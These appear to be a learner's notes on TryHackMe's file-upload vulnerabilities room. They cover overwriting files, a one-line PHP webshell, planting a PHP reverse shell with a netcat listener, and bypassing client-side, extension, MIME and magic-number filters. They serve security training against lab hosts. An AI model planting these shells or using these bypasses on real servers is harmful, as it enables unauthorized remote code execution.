## Getting Started

- The **hosts file** maps domain names to IP addresses locally, bypassing DNS.
    
- You add a line that maps `10.48.179.246` to a list of `.thm` hostnames. Your computer then treats those names as if they resolve to that IP.
    
- This is required because the TryHackMe machine’s DNS isn’t available; the hosts entry lets you use **name-based virtual hosting (vhosts)** so the webserver at that single IP can serve different sites based on the **Host** header in the HTTP request.

- On Linux and MacOS the hosts file can be found at `nano /etc/hosts`.
- On Windows the hosts file can be found at `C:\Windows\System32\drivers\etc\hosts`.

On Linux or MacOS you will need to use `sudo` to open the file for writing. In Windows you will need to open the file with "Run as Administrator".

Add the following line in at the end of the file:
`10.48.179.246    overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm`

## Overwriting Existing Files

checks may be applied to see if the filename already exists on the server; if a file with the same name already exists then the server will return an error message asking the user to pick a different file name. 
File permissions also come into play when protecting existing files from being overwritten. 
Web pages, for example, should not be writeable to the web user, thus preventing them from being overwritten with a malicious version uploaded by an attacker.

In the following image we have a web page with an upload form:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759494686706.png)

You may need to enumerate more than this for a real challenge; however, in this instance, let's just take a look at the source code of the page:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759494769552.png)

Inside the red box, we see the code that's responsible for displaying the image that we saw on the page. It's being sourced from a file called "spaniel.jpg", inside a directory called "images".

Now we know where the image is being pulled from -- can we overwrite it?

Let's download another image from the internet and call it `spaniel.jpg`. We'll then upload it to the site and see if we can overwrite the existing image:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759495388389.png)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e86dbbd98fde62929a7e03b/room-content/5e86dbbd98fde62929a7e03b-1759495947155.png)

And our attack was successful! We managed to overwrite the original `images/spaniel.jpg` with our own copy.

## Remote Code Execution

Remote Code Execution (as the name suggests) would allow us to execute code arbitrarily on the web server.

Remote code execution via an upload vulnerability in a web application tends to be exploited by uploading a program written in the same language as the back-end of the website (or another language which the server understands and will execute).

It's worth noting that in a _routed_ application (i.e. an application where the routes are defined programmatically rather than being mapped to the file-system), this method of attack becomes a lot more complicated and a lot less likely to occur. Most modern web frameworks are routed programmatically.

There are two basic ways to achieve RCE on a webserver when exploiting a file upload vulnerability: webshells, and reverse/bind shells. Realistically a fully featured reverse/bind shell is the ideal goal for an attacker; however, a webshell may be the only option available (for example, if a file length limit has been imposed on uploads, or if firewall rules prevent any network-based shells).

As a general methodology, we would be looking to upload a shell of one kind or another, then activating it, either by navigating directly to the file if the server allows it (non-routed applications with inadequate restrictions), or by otherwise forcing the webapp to run the script for us (necessary in routed applications).

_Web shells:_

Let's assume that we've found a webpage with an upload form:

![](https://assets.tryhackme.com/additional/imgur/GxMJAKH.png)

Where do we go from here? Well, let's start with a gobuster scan:![](https://assets.tryhackme.com/additional/imgur/OftwAIE.png)

Looks like we've got two directories here -- `uploads` and `assets`. Of these, it seems likely that any files we upload will be placed in the "uploads" directory. We'll try uploading a legitimate image file first. Here I am choosing our cute dog photo from the previous task:

![](https://assets.tryhackme.com/additional/imgur/aAyIrod.png)

![](https://assets.tryhackme.com/additional/imgur/mIbGRIk.png)

Now, if we go to `http://demo.uploadvulns.thm/uploads` we should see that the spaniel picture has been uploaded!

![](https://assets.tryhackme.com/additional/imgur/lVe2tjL.png)

![](https://assets.tryhackme.com/additional/imgur/N8vWlVO.png)

Ok, we can upload images. Let's try a webshell now.

As it is, we know that this webserver is running with a PHP back-end, so we'll skip straight to creating and uploading the shell. In real life, we may need to do a little more enumeration; however, PHP is a good place to start regardless.

A simple webshell works by taking a parameter and executing it as a system command. In PHP, the syntax for this would be:

`<?php       echo system($_GET["cmd"]);   ?>`   

This code takes a GET parameter and executes it as a system command. It then echoes the output out to the screen.

Let's try uploading it to the site, then using it to show our current user and the contents of the current directory:

![](https://assets.tryhackme.com/additional/imgur/CU0Uyx5.png)

Success!

---

_Reverse Shells:_

The process for uploading a reverse shell is almost identical to that of uploading a webshell, so this section will be shorter. We'll be using the ubiquitous Pentest Monkey reverse shell, which comes by default on Kali Linux, but can also be downloaded [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php). You will need to edit line 49 of the shell. It will currently say `$ip = '127.0.0.1';  // CHANGE THIS   ` -- as it instructs, change `127.0.0.1` to your TryHackMe tun0 IP address, which can be found on the [access page](https://tryhackme.com/access). You can ignore the following line, which also asks to be changed. With the shell edited, the next thing we need to do is start a Netcat listener to receive the connection. `nc -lvnp 1234`:

![](https://assets.tryhackme.com/additional/imgur/ysY306E.png)

Now, let's upload the shell, then activate it by navigating to `http://demo.uploadvulns.thm/uploads/shell.php`. The name of the shell will obviously be whatever you called it (`php-reverse-shell.php` by default).

The website should hang and not load properly -- however, if we switch back to our terminal, we have a hit!

![](https://assets.tryhackme.com/additional/imgur/he0hbiR.png)

Once again, we have obtained RCE on this webserver.

## Filtering

When we talk about a script being "Client-Side", in the context of web applications, we mean that it's running in the user's browser as opposed to on the web server itself. JavaScript is pretty much ubiquitous as the client-side scripting language, although alternatives do exist.  Regardless of the language being used, a client-side script will be run in your web browser. 

In the context of file-uploads, this means that the filtering occurs before the file is even uploaded to the server. Theoretically, this would seem like a good thing, right? In an ideal world, it would be; however, because the filtering is happening on _our_ computer, it is trivially easy to bypass. As such client-side filtering by itself is a highly insecure method of verifying that an uploaded file is not malicious.

Conversely, as you may have guessed, a _server_-side script will be run on the server. Traditionally PHP was the predominant server-side language (with Microsoft's ASP for IIS coming in close second); however, in recent years, other options (C#, Node.js, Python, Ruby on Rails, and a variety of others) have become more widely used. Server-side filtering tends to be more difficult to bypass, as you don't have the code in front of you. As the code is executed on the server, in most cases it will also be impossible to bypass the filter completely; instead we have to form a payload which conforms to the filters in place, but still allows us to execute our code.

---- 

_Extension Validation:_

File extensions are used (in theory) to identify the contents of a file. In practice they are very easy to change, so actually don't mean much; however, MS Windows still uses them to identify file typesFilters that check for extensions work in one of two ways. They either _blacklist_ extensions (i.e. have a list of extensions which are **not** allowed) or they _whitelist_ extensions (i.e. have a list of extensions which **are** allowed, and reject everything else).

File Type Filtering:

_MIME validation:_ MIME (**M**ultipurpose **I**nternet **M**ail **E**xtension) types are used as an identifier for files -- originally when transfered as attachments over email, but now also when files are being transferred over HTTP(S). The MIME type for a file upload is attached in the header of the request, and looks something like this:  
    ![](https://assets.tryhackme.com/additional/imgur/uptWRKW.png)  
      
    MIME types follow the format <type>/<subtype>. In the request above, you can see that the image "spaniel.jpg" was uploaded to the server. As a legitimate JPEG image, the MIME type for this upload was "image/jpeg". The MIME type for a file can be checked client-side and/or server-side; however, as MIME is based on the extension of the file, this is extremely easy to bypass.  
      

Magic Number validation**:**_ Magic numbers are the more accurate way of determining the contents of a file; although, they are by no means impossible to fake. The "magic number" of a file is a string of bytes at the very beginning of the file content which identify the content. For example, a PNG file would have these bytes at the very top of the file: `89 50 4E 47 0D 0A 1A 0A`.  
    ![](https://assets.tryhackme.com/additional/imgur/vHQWOgi.png)  
    Unlike Windows, Unix systems use magic numbers for identifying files

_File Length Filtering:_

File length filters are used to prevent huge files from being uploaded to the server via an upload form (as this can potentially starve the server of resources). In most cases this will not cause us any issues when we upload shells; however, it's worth bearing in mind that if an upload form only expects a very small file to be uploaded, there may be a length filter in place to ensure that the file length requirement is adhered to. As an example, our fully fledged PHP reverse shell from the previous task is 5.4Kb big -- relatively tiny, but if the form expects a maximum of 2Kb then we would need to find an alternative shell to upload.

_File Content Filtering:_

More complicated filtering systems may scan the full contents of an uploaded file to ensure that it's not spoofing its extension, MIME type and Magic Number. This is a significantly more complex process than the majority of basic filtration systems employ

--------------------

It's worth noting that none of these filters are perfect by themselves -- they will usually be used in conjunction with each other, providing a multi-layered filter, thus increasing the security of the upload significantly. Any of these filters can all be applied client-side, server-side, or both.

## Bypassing Client-Side Filtering

client-side filtering tends to be extremely easy to bypass, as it occurs entirely on a machine that _you_ control.

There are four easy ways to bypass your average client-side file upload filter:

1. _Turn off Javascript in your browser_ -- this will work provided the site doesn't require Javascript in order to provide basic functionality.
2. _Intercept and modify the incoming page._ Using Burpsuite, we can intercept the incoming web page and strip out the Javascript filter before it has a chance to run.
3. _Intercept and modify the file upload_. Where the previous method works _before_ the webpage is loaded, this method allows the web page to load as normal, but intercepts the file upload after it's already passed (and been accepted by the filter).
4. _Send the file directly to the upload point._ Why use the webpage with the filter, when you can send the file directly using a tool like `curl`? Posting the data directly to the page which contains the code for handling the file upload is another effective method for completely bypassing a client side filter.the syntax for such a command would look something like this: `curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>`. To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

Let's assume that, once again, we have found an upload page on a website:

![](https://assets.tryhackme.com/additional/imgur/fI67jX0.png)

As always, we'll take a look at the source code. Here we see a basic Javascript function checking for the MIME type of uploaded files:

![](https://assets.tryhackme.com/additional/imgur/TrI5jQD.png)

In this instance we can see that the filter is using a _whitelist_ to exclude any MIME type that isn't `image/jpeg`.

Our next step is to attempt a file upload -- as expected, if we choose a JPEG, the function accepts it. Anything else and the upload is rejected.

Having established this, let's start [Burpsuite](https://blog.tryhackme.com/setting-up-burp/) and reload the page. We will see our own request to the site, but what we really want to see is the server's _response_, so right click on the intercepted data, scroll down to "Do Intercept", then select "Response to this request":

![](https://assets.tryhackme.com/additional/imgur/T0RjAry.png)

When we click the "Forward" button at the top of the window, we will then see the server's response to our request. Here we can delete, comment out, or otherwise break the Javascript function before it has a chance to load:

![](https://assets.tryhackme.com/additional/imgur/ACgWLpH.png)

Having deleted the function, we once again click "Forward" until the site has finished loading, and are now free to upload any kind of file to the website:

![](https://assets.tryhackme.com/additional/imgur/5cyqjqa.png)

It's worth noting here that Burpsuite will not, by default, intercept any external Javascript files that the web page is loading. If you need to edit a script which is not inside the main page being loaded, you'll need to go to the "Options" tab at the top of the Burpsuite window, then under the "Intercept Client Requests" section, edit the condition of the first line to remove `^js$|`:

![](https://assets.tryhackme.com/additional/imgur/95hi6pX.png)

---

We've already bypassed this filter by intercepting and removing it prior to the page being loaded, but let's try doing it by uploading a file with a legitimate extension and MIME type, then intercepting and correcting the upload with Burpsuite.

Having reloaded the webpage to put the filter back in place, let's take the reverse shell that we used before and rename it to be called "shell.jpg". As the MIME type (based on the file extension) automatically checks out, the Client-Side filter lets our payload through without complaining:

![](https://assets.tryhackme.com/additional/imgur/WNpruFM.png)

Once again we'll activate our Burpsuite intercept, then click "Upload" and catch the request:

![](https://assets.tryhackme.com/additional/imgur/h2164Li.png)

Observe that the MIME type of our PHP shell is currently `image/jpeg`. We'll change this to `text/x-php`, and the file extension from `.jpg` to `.php`, then forward the request to the server:

![](https://assets.tryhackme.com/additional/imgur/sqmwssT.png)

Now, when we navigate to `http://demo.uploadvulns.thm/uploads/shell.php` having set up a netcat listener, we receive a connection from the shell!

![](https://assets.tryhackme.com/additional/imgur/cUqNO2L.png)

## Bypassing Server-Side Filtering: File Extensions

###  🧠 What is server-side filtering?

Unlike client-side filters (JavaScript), which run in your browser,  
**server-side filters run on the server**, so you CANNOT see or edit them.

You must:

- Upload files
    
- See what gets accepted or rejected
    
- Test different tricks until something bypasses the filter
    

This is called **black-box testing**.

---

### 🎯 Goal of Task 8

You want the server to accept **a PHP shell**, even though the server blocks dangerous file extensions like `.php`.

---

### 🧩 Example 1 — You ARE given the server code

They show you this:

`$extension = pathinfo($_FILES["fileToUpload"]["name"])["extension"];  switch($extension){     case "php":     case "phtml":     case NULL:         $uploadFail = True;         break;     default:         $uploadFail = False; }`

### ✔️ What this means

- Server **only blocks:**
    
    - `.php`
        
    - `.phtml`
        
- Server **checks ONLY the last extension**, after the last dot.
    

So:

|Filename|Allowed or Blocked?|
|---|---|
|`shell.php`|❌ Blocked|
|`shell.phtml`|❌ Blocked|
|`shell.php5`|✅ Allowed|
|`shell.php7`|✅ Allowed|
|`shell.phar`|✅ Allowed|
|`shell.pht`|✅ Allowed|

But some of these **may not execute** on the server.

### 🔑 The trick

Try different alternative PHP extensions.

They discover:

### 🎉 `.phar` works

`payload.phar` is:

- NOT blocked by the filter
    
- AND the server executes it as PHP
    

So you get a shell.

---

### 🧩 Example 2 — Black-box testing (no code shown)

You only have the upload page.

### Step 1 — Test a safe file

Upload `spaniel.jpg`  
→ Works.

So you know `.jpg` is allowed.

### Step 2 — Test a dangerous file

Upload `shell.php`  
→ Blocked.

So server blocks `.php`.

### Step 3 — Test alternative PHP extensions

Try `.php3`, `.php5`, `.phar`, `.pht`, etc.  
→ None work here.

### Step 4 — Try _double extensions_

What if the filter is weak and only checks if **“.jpg” appears anywhere in filename**?

Try uploading:

`shell.jpg.php`

This filename **contains `.jpg`**, so it may pass the filter.

And it does.

This means the server code was something like:

`IF filename contains ".jpg" → allow`

### Step 5 — After upload

Go to `/uploads/shell.jpg.php`

The server interprets the **last extension** `.php`  
→ Your PHP runs  
→ You get a shell

---

### 🧠 Key Lesson (VERY Important)

Server-side bypassing = **test everything**

- Which extensions get blocked?
    
- Which ones execute?
    
- Does the server use:
    
    - last extension?
        
    - first extension?
        
    - all extensions?
        
    - substring check?
        
- Can you use:
    
    - double extensions?
        
    - weird extensions?
        
    - uppercase extensions?
        
    - extension with trailing dot? (`shell.php.`)
        
    - null byte tricks? (`shell.php%00.jpg`)
        
    - MIME spoofing?
        

Every filter works differently.  
Your bypass must match THAT filter.

---

### ✔️ Ultra-Simple Summary

| Trick                     | Example         | Why it works                                     |
| ------------------------- | --------------- | ------------------------------------------------ |
| Alternative PHP extension | `shell.phar`    | Server blocks only `.php` and `.phtml`           |
| Double extension          | `shell.jpg.php` | Server only checks if filename _contains_ `.jpg` |
| Last extension check      | `shell.php5`    | Server checks last dot only                      |

## Bypassing Server-Side Filtering: Magic Numbers

magic numbers are used as a more accurate identifier of files. The magic number of a file is a string of hex digits, and is always the very first thing in a file. Knowing this, it's possible to use magic numbers to validate file uploads, simply by reading those first few bytes and comparing them against either a whitelist or a blacklist. Bear in mind that this technique can be very effective against a PHP based webserver; however, it can sometimes fail against other types of webserver

Let's take a look at an example. As per usual, we have an upload page:

![](https://assets.tryhackme.com/additional/imgur/yQnQGsn.png)

As expected, if we upload our standard shell.php file, we get an error; however, if we upload a JPEG, the website is fine with it. All running as per expected so fa

From the previous attempt at an upload, we know that JPEG files are accepted, so let's try adding the JPEG magic number to the top of our `shell.php` file. A quick look at the [list of file signatures on Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures) shows us that there are several possible magic numbers of JPEG files. It shouldn't matter which we use here, so let's just pick one (`FF D8 FF DB`). We could add the ASCII representation of these digits (ÿØÿÛ) directly to the top of the file but it's often easier to work directly with the hexadecimal representation, so let's cover that method.

Before we get started, let's use the Linux `file` command to check the file type of our shell:

![](https://assets.tryhackme.com/additional/imgur/2126EHS.png)

As expected, the command tells us that the filetype is PHP. Keep this in mind as we proceed with the explanation.

We can see that the magic number we've chosen is four bytes long, so let's open up the reverse shell script and add four random characters on the first line. These characters do not matter, so for this example we'll just use four "A"s:

![](https://assets.tryhackme.com/additional/imgur/oe434wu.png)

Save the file and exit. Next we're going to reopen the file in `hexeditor` (which comes by default on Kali), or any other tool which allows you to see and edit the shell as hex. In hexeditor the file looks like this:

![](https://assets.tryhackme.com/additional/imgur/otIyN96.png)

Note the four bytes in the red box: they are all `41`, which is the hex code for a capital "A" -- exactly what we added at the top of the file previously.

Change this to the magic number we found earlier for JPEG files: `FF D8 FF DB`

![](https://assets.tryhackme.com/additional/imgur/2OlGKdQ.png)

Now if we save and exit the file (Ctrl + x), we can use `file` once again, and see that we have successfully spoofed the filetype of our shell:

![](https://assets.tryhackme.com/additional/imgur/ldyt88v.png)

Perfect. Now let's try uploading the modified shell and see if it bypasses the filter!

![](https://assets.tryhackme.com/additional/imgur/Coat5LI.png)

There we have it -- we bypassed the server-side magic number filter and received a reverse shell.

## Example Methodology

### 🎯 What is Task 10 about?

It teaches you **how to approach ANY file upload challenge** like a hacker or pentester.  
Think of it as a **checklist** you follow every time.

---

### ✅ Step-by-Step Simple Methodology

### **1️⃣ Look at the whole website first**

Before touching the upload page, check:

- What technologies is the site using? (PHP? ASP? Apache? Nginx?)
    
- Use tools:
    
    - Browser DevTools → Network tab
        
    - Wappalyzer extension
        
    - BurpSuite (intercept page → check `Server:` and `X-Powered-By:` headers)
        

Goal:  
Know what environment you’re attacking.

---

### **2️⃣ Find the upload page & check client-side filters**

On the upload page:

- View source
    
- Look for JavaScript blocking file types
    
- Try turning off JavaScript
    
- Intercept the page in Burp and remove JS restrictions
    

Goal:  
Understand what the browser checks — and bypass it easily.

---

### **3️⃣ Upload a harmless file**

Upload something safe, like `image.jpg`.

Why?

- You want to see:
    
    - Does the file upload?
        
    - Where is it stored? (`/uploads/` ? `/images/` ?)
        
    - Can you access it in your browser?
        

If you _can_ access it, you now know:

- The upload folder path
    
- The naming scheme (does server rename files?)
    
- The upload process behavior
    

Use **Gobuster** if the folder is not obvious.

Example:

`gobuster dir -u http://site -w wordlist.txt -x php,txt,html`

---

### **4️⃣ Now upload a malicious file**

Example: `shell.php`

This will usually be blocked — **good!**  
The **error message** gives clues:

- “Extension not allowed” → extension filter
    
- “Invalid file type” → MIME filter
    
- “File signature not allowed” → magic bytes filter
    
- “File too large” → file-size filter
    

---

### 🔍 Step 5: Figure out what kind of server-side filter it uses

### **A) Test for extension blacklist / whitelist**

Try uploading:

`test.abcxyz`

- If it **uploads** → server uses a **blacklist** (blocks only specific extensions)
    
- If it **fails** → server uses a **whitelist** (only allows certain extensions)
    

---

### **B) Test magic number (file signature) filtering**

Magic numbers = first few bytes of a file (e.g., JPG starts with `FFD8`).

Try:

1. Take a valid JPG (works normally)
    
2. Change its magic bytes to something bad (like `GIF89a`)
    
3. Upload again
    

If upload fails → server checks magic numbers.

---

### **C) Test MIME type filtering**

Intercept upload request in BurpSuite, change:

`Content-Type: image/jpeg`

to something bad:

`Content-Type: application/x-php`

If upload fails → server checks MIME type.

---

### **D) Test file size filter**

Upload small → works  
Upload bigger → works  
Upload even bigger → fails  
→ Now you know the max allowed size.

---

## Challenge

## Conclusion

Now that you've finished the room, remember to revert the changes you made your `hosts` file, way back in Task 1.

As a reminder, here are the commands to do so.

On Linux or MacOS:

`sudo sed -i '$d' /etc/hosts`

On Windows:

`(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts`
